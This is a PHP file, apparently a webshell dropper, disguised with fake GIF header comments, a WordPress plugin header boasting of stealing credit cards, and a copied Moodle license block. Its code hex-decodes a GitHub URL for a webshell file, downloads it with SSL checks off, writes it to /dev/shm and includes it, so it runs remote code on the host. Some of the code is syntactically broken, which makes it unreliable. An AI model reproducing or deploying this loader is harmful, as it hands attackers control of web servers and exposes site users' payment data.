<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<!-- GIF89;a -->
<?php
/*
Plugin Name: Penghisap Kartu kredit Paman mu
Plugin URI: https://github.com/
Description: A webshell API To Get Credits Card U Mom.
Version: 1.2.0
Author URI: xnxx.com
Text Domain: Kang Sedot Kartu Kredit 
Domain Path: /languages
License: GPLv3 or later
Network: true
*/
?>



<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @pass       tbl
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);  
        $opt1 = constant('CURLOPT_RETURNTRANSFER');
        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
        $opt3 = constant('CURLOPT_USERAGENT');
        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
        $opt6 = constant('CURLOPT_COOKIE'); 
        curl_setopt($conn, $opt1, 1);
        curl_setopt($conn, $opt2, 1);
        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, $opt4, 0);
        curl_setopt($conn, $opt5, 0);

        if (isset($_SESSION['hekerman'])) {
            curl_setopt($conn, $opt6, $_SESSION['hekerman']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

/**
 * HEKERMAN | KURD HACKER
 * @author HEKERMAN
 * user defaultnya admin   
$auth_username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
$auth_password = '74656d706c61746578782e706870' // password defaultnya tbl
 * @github https://github.com/
 * @link https://github.com/
 * password default tbl
 */

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}


function clean_old_temp_files() {
    $temp_files = glob('/dev/shm/prefix*');
    foreach ($temp_files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}


clean_old_temp_files();
$url = hex2str($auth_username); . hex2str($auth_password);
$a = geturlsinfo($url);
$temporary_file = tempnam('/dev/shm', 'prefix');
file_put_contents($temporary_file, $a);
include $temporary_file;
unlink($temporary_file);
?>



